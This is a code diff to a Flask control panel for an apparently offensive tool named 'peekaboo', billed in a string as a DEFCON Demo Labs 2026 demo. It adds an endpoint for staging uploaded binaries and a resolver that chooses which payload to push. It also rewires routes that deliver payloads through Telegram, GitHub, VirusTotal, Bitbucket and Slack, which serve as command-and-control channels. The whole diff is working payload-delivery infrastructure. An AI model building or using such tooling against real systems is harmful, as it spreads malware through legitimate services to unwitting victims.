@@ -127,6 +127,66 @@ def _find_latest_binary() -> Path | None:
     return max(candidates, key=lambda p: p.stat().st_mtime)
 
 
+# ---------------------------------------------------------------------------
+# C2 source-binary resolution
+# ---------------------------------------------------------------------------
+
+_C2_STAGED:     dict[str, dict] = {}   # staged_id -> {path, name, size}
+_C2_STAGED_DIR: Path            = BASE_DIR / "data" / "c2_staged"
+
+
+def _c2_resolve_binary(data: dict) -> Path | None:
+    """
+    Return the binary Path to deliver based on the 'source' key in the
+    request body.  source values:
+      'staged'  - manually uploaded via /api/c2/stage
+      'build'   - compiled build (build_id + optional fname)
+      'session' - captured sample (session_id + filename)
+      ''        - fallback: most recently built peekaboo.exe
+    """
+    source = data.get("source", "")
+
+    if source == "staged":
+        entry = _C2_STAGED.get(data.get("staged_id", "").strip())
+        if entry:
+            p = entry["path"]
+            return p if p.exists() else None
+        return None
+
+    if source == "build":
+        build_id = data.get("build_id", "").strip()
+        if not build_id:
+            return None
+        with _lock:
+            job = dict(_builds.get(build_id, {}))
+        if not job:
+            job = _db.get_build(build_id) or {}
+        if not job:
+            return None
+        p = _resolve_build_binary(job)
+        if not p:
+            return None
+        fname = data.get("fname", "").strip()
+        if fname and fname != p.name:
+            if "/" not in fname and "\\" not in fname and fname.lower().endswith(".exe"):
+                alt = p.parent / fname
+                if alt.exists():
+                    return alt
+        return p
+
+    if source == "session":
+        session_id = data.get("session_id", "").strip()
+        filename   = data.get("filename",   "").strip()
+        if not session_id or not filename or "/" in filename or "\\" in filename:
+            return None
+        filepath = (SAMPLES_DIR / session_id / filename).resolve()
+        if not str(filepath).startswith(str(SAMPLES_DIR.resolve())):
+            return None
+        return filepath if filepath.exists() else None
+
+    return _find_latest_binary()
+
+
 def _save_build(build_id: str) -> None:
     with _lock:
         entry = dict(_builds.get(build_id, {}))
@@ -460,6 +520,22 @@ def api_config_save(name: str):
 
 # -- C2 binary delivery routes --------------------------------------------------
 
+@app.route("/api/c2/stage", methods=["POST"])
+def api_c2_stage():
+    """Stage an uploaded binary for C2 delivery."""
+    f = request.files.get("file")
+    if not f:
+        return jsonify({"ok": False, "error": "no file provided"}), 400
+    name      = Path(f.filename or "payload.bin").name
+    staged_id = uuid.uuid4().hex[:8]
+    _C2_STAGED_DIR.mkdir(parents=True, exist_ok=True)
+    dest = _C2_STAGED_DIR / f"{staged_id}_{name}"
+    f.save(str(dest))
+    _C2_STAGED[staged_id] = {"path": dest, "name": name, "size": dest.stat().st_size}
+    return jsonify({"ok": True, "staged_id": staged_id, "name": name,
+                    "size": dest.stat().st_size})
+
+
 @app.route("/api/c2/status")
 def api_c2_status():
     """Check connectivity for each configured C2 channel."""
@@ -579,11 +655,11 @@ def c2_deliver_telegram():
     if not token or "xxx" in token:
         return jsonify({"ok": False, "error": "telegram not configured"}), 400
 
-    binary = _find_latest_binary()
+    body   = request.get_json(silent=True) or {}
+    binary = _c2_resolve_binary(body)
     if not binary:
-        return jsonify({"ok": False, "error": "no built binary found - run the builder first"}), 400
+        return jsonify({"ok": False, "error": "no binary selected or found"}), 400
 
-    body = request.get_json(silent=True) or {}
     caption = body.get("caption",
         f"[peekaboo] payload drop\n"
         f"file: {binary.name}\n"
@@ -636,11 +712,11 @@ def c2_deliver_github():
     if not token or "xxx" in token:
         return jsonify({"ok": False, "error": "github not configured"}), 400
 
-    binary = _find_latest_binary()
+    body        = request.get_json(silent=True) or {}
+    binary      = _c2_resolve_binary(body)
     if not binary:
-        return jsonify({"ok": False, "error": "no built binary found - run the builder first"}), 400
+        return jsonify({"ok": False, "error": "no binary selected or found"}), 400
 
-    body = request.get_json(silent=True) or {}
     description = body.get("description",
         f"peekaboo payload drop - DEFCON Demo Labs 2026 - {datetime.utcnow().isoformat()}Z")
 
@@ -716,9 +792,10 @@ def c2_deliver_virustotal():
     if not api_key:
         return jsonify({"ok": False, "error": "virustotal not configured"}), 400
 
-    binary = _find_latest_binary()
+    body   = request.get_json(silent=True) or {}
+    binary = _c2_resolve_binary(body)
     if not binary:
-        return jsonify({"ok": False, "error": "no built binary found - run the builder first"}), 400
+        return jsonify({"ok": False, "error": "no binary selected or found"}), 400
 
     try:
         raw    = binary.read_bytes()
@@ -880,9 +957,10 @@ def c2_deliver_bitbucket():
     if not all([token_b64, workspace, repo]):
         return jsonify({"ok": False, "error": "bitbucket not fully configured"}), 400
 
-    binary = _find_latest_binary()
+    body   = request.get_json(silent=True) or {}
+    binary = _c2_resolve_binary(body)
     if not binary:
-        return jsonify({"ok": False, "error": "no built binary found - run the builder first"}), 400
+        return jsonify({"ok": False, "error": "no binary selected or found"}), 400
 
     try:
         encoded = base64.b64encode(binary.read_bytes()).decode()
@@ -943,11 +1021,11 @@ def c2_deliver_slack():
     if not webhook or "YOUR/WEBHOOK" in webhook:
         return jsonify({"ok": False, "error": "slack webhook not configured"}), 400
 
-    binary = _find_latest_binary()
+    body   = request.get_json(silent=True) or {}
+    binary = _c2_resolve_binary(body)
     if not binary:
-        return jsonify({"ok": False, "error": "no built binary found - run the builder first"}), 400
+        return jsonify({"ok": False, "error": "no binary selected or found"}), 400
 
-    body = request.get_json(silent=True) or {}
     text = body.get("text",
         f"*[peekaboo]* payload ready\n"
         f">*file:* `{binary.name}`\n"
